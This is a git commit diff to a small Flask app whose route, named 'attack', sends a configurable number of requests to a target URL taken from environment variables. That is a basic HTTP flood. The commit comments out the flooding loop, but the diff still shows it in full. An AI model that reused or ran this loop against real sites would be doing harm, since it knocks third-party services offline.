ce3d82b0240e23b328f5498f2a86874b8ad47f94
national-salvation-party <156296708+national-salvation-party@users.noreply.github.com>
2024-01-11 18:10:33 +0900

    Update index.py

--- api/index.py
+++ api/index.py
@@ -8,9 +8,9 @@ app = Flask(__name__)
 
 @app.route('/')
 def attack():
-    targreq=request.Request(os.getenv('TARGET_URL'))
-    for i in range(int(os.getenv('NUM_REQUESTS'))):
-        response=request.urlopen(targreq)
+    #targreq=request.Request(os.getenv('TARGET_URL'))
+    #for i in range(int(os.getenv('NUM_REQUESTS'))):
+    #    response=request.urlopen(targreq)
         #print(response)
     return render_template('index.html')
 
